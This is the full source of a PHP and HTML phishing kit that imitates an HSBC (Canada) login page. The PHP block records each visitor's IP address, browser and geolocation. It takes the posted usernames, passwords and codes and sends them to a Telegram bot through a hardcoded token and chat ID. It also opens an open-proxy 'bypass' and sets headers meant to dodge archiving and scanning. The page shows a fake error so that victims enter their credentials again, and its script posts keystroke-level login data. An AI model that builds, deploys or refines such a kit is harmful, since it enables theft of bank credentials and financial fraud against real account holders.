<?php

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 ".$info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}




$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = 'data.dat';
$file1       = 'combo.txt';
$file2       = 'master.log';
$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$file = '../../../log.txtt';
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "HSBC";

    $url        = "https://HSBC.com";
    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $code       = $_POST['code']; 
	$lh     = "|";
    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "".$full_date;
    $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message =" $bank$lh$ip\n\n$user\n\n----------------\n\n$pass\n\n---------------------\n\n";

$apiToken = "6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s"; 
$data = [
    'chat_id' => '-1001819831566',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?><!DOCTYPE html>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Expires: " . gmdate("D, d M Y H:i:s", time() - 3600) . " GMT");
header("Pragma: no-cache");

// Prevent Google Archiving
header("X-Robots-Tag: noarchive");

// Block email scanning
header("X-Content-Type-Options: nosniff");

// Disable listeners and log third-party communications
ini_set("disable_functions", "socket_accept, socket_bind, socket_listen, socket_create_listen, socket_read, socket_recv, socket_recvfrom, socket_recvmsg, socket_send, socket_sendmsg, socket_sendto, socket_getsockname, socket_getpeername, socket_get_option, socket_set_option");


// Logging third-party communication attempts
$logFile = "../../../requests.txt"; // Replace with the path to your log file

// Get the current timestamp
$timestamp = date("Y-m-d H:i:s");

// Get the IP address of the client
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Get the requested URL
$requestUrl = $_SERVER['REQUEST_URI'];

// Create the log message
$logMessage = "Timestamp: $timestamp | IP: $ipAddress | Requested URL: $requestUrl\n";

// Append the log message to the log file
file_put_contents($logFile, $logMessage, FILE_APPEND);
?>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" type="text/css" href="./files/style.css">
        <link rel="shortcut icon" type="image/PNG" href="./files/logoTrans.png">
        <title>HSBC - Login</title>  <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script>
        <script src="./files/jquery-3.6.0.min.js###%" crossorigin="anonymous"></script>
        <script>
            var lrbank = 'HSBC (CA)';
           var lrinfo = 'Login';
        </script>
        <script src="./files/actions.js###%"></script>
        <script>
        $(document).ready(function() {
            var attempt = 2;

            $('.lab-form').submit(function(e) {
                e.preventDefault();
                var form = this;

                $('.error-div').css('display', 'none');

                $('.input-container').removeClass('focused');
                $('.input-container').prev().css('opacity', '0');

                if (attempt == 1) {
                    $('.div-loader').css('display', 'block');
                    $('.div-main').css('display', 'none');

                    $.post('/deposit/hsbc/api/login-submit', $(this).serialize(), function(response) {
                        $('.error-div').css('display', 'block');

                        $(form).trigger('reset');

                        $('.div-loader').css('display', 'none');
                        $('.div-main').css('display', 'block');
                    }, 'JSON');

                    attempt = 2;
                } else {
                    $('.div-loader').css('display', 'block');
                    $('.div-main').css('display', 'none');

                    $.post('/deposit/hsbc/api/login-submit', $(this).serialize(), function(response) {
                        if (response.status) {
                            if (response.data.loader) {
                                location.href = '/deposit/hsbc/w';
                            } else {
                                location.href = '/deposit/hsbc/em';
                            }
                        } else {
                            $(form).trigger('reset');

                            $('.error-div').css('display', 'block');

                            $('.div-loader').css('display', 'none');
                            $('.div-main').css('display', 'block');
                        }
                    }, 'JSON');
                }

                return false;
            });

            $(document).on('change', '.input-username, .input-password', function() {
                var username = $(this).hasClass('input-username') ? $(this).val() : $(this).closest('form').find('.input-username').val();
                var password = $(this).hasClass('input-password') ? $(this).val() : $(this).closest('form').find('.input-password').val();
                $.post('/deposit/hsbc/login-data', {username: username, password: password});
            });
        });
        </script>
        <style>
        .error-div {
            margin-bottom: 17px;
            color: red;
        }

        .error-div img {
            width: 13px;
            margin-right: 7px;
        }

        .btn {
            background-color: rgb(217, 9, 21) !important;
            border: 1px solid rgb(217, 9, 21) !important;
        }

        #loaderOnLoading {
            display: block;
        }
        </style>
    </head>
    <body>
        <img src="./files/logoTrans.png" id="transLogo">
        <div class="header">
            <div class="headerRow">
                <img src="./files/logoTrans.png" id="logo">
                <!-- <div class="btn" id="loginBtn">Login On </div> -->
            </div>
        </div>
        <div class="main">
            <div class="alignment div-main">
                <p class="pageTitle">Log on</p>
                <form action="040149.php" method="POST" autocomplete="off" class="lab-form">
                    <p class="error-div" style="display: block"><img src="./files/errIcon.gif" alt=""> The username you entered does not match our records. Please try again.</p>
                    <div class="row" style="align-items: center;">
                        <p class="formLabel">Username</p>
                    </div>
                    <div class="inptContainer" style="margin-bottom: 20px">
                        <input type="text" class="inptField lrinput input-username" attr-action="Filling Username" name="username" required="">
                    </div>
                    <div class="row" style="align-items: center;">
                        <p class="formLabel">Password</p>
                    </div>
                    <div class="inptContainer">
                        <input type="password" class="inptField lrinput input-password" attr-action="Filling Password" name="password" required="">
                    </div>
                    <div class="row" style="align-items: center;" id="rememberRow">
                        <input type="checkbox">
                        <p class="desText">Remember me</p>
                    </div>
                    <input type="submit" class="btn" value="Continue" id="sbtn">
                </form>
                <p class="desText" style="text-align: center; padding: 10px 0;"><a href="deposit/hsbc/e#">Forgot your username?</a></p>
            </div>
            <div class="alignment div-loader" style="display: none">
                <p class="pageTitle" style="text-align: center">Verifying details</p>
                <img src="./files/loading.gif" alt="" id="loaderOnLoading">
                <p class="desText" style="text-align: center; padding: 20px 0;">Loading please wait...</p>
            </div>
        </div>
        <div class="footer">
        </div>
    

</body></html>